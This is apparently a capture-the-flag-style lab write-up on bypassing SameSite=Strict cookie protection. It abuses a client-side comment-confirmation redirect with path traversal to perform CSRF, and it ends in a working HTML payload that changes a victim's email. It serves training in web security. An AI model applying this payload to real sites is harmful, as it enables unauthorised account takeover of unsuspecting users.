### Lab: SameSite Strict bypass via client-side redirect

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

You can log in to your own account using the following credentials: wiener:peter

_____

Analysis and Exploit:

1. Logged-in as user _wiener_, assigen session cookie with SameSite=Stric flag
```Set-Cookie: session=bcOGuoGFahOHetIsasKtpzUDY3o2jp1Z; Secure; HttpOnly; SameSite=Strict```

2. Server accepts GET method on **/my-account/change-email?email=ta%40st&submit=1**

3. After posting a comment, the application redirected to **/post/{id}** using a Javascript script, _commentConfirmationRedircect.js_

```javascript
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
Cache-Control: public, max-age=3600
X-Frame-Options: SAMEORIGIN
Content-Length: 231

redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```

where variable **blogPath** is **/post**, as specified in the response body to **GET /post/comment/confirmation?postId={id}** request:

```html
<script src='/resources/js/commentConfirmationRedirect.js'></script>
<script>redirectOnConfirmation('/post');</script>
```

```new URL```: The URL() constructor returns a newly created URL object representing the URL defined by the parameters

```url.searchParams.get("postId")```: The searchParams readonly property of the URL interface returns a URLSearchParams object allowing access to the GET decoded query arguments contained in the URL


Injected **1/../../my-account**


```javascript
redirectOnConfirmation = ('/post') => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = '/post' + '/' + '1/../../my-account';
    }, 3000);
}
```

resulted in **/my-account**

4. Payload:

```html
<script>
    document.location = "URL/post/comment/confirmation?postId=1/../../my-account/change-email?email=yougot%40hacked%26submit=1"
</script>```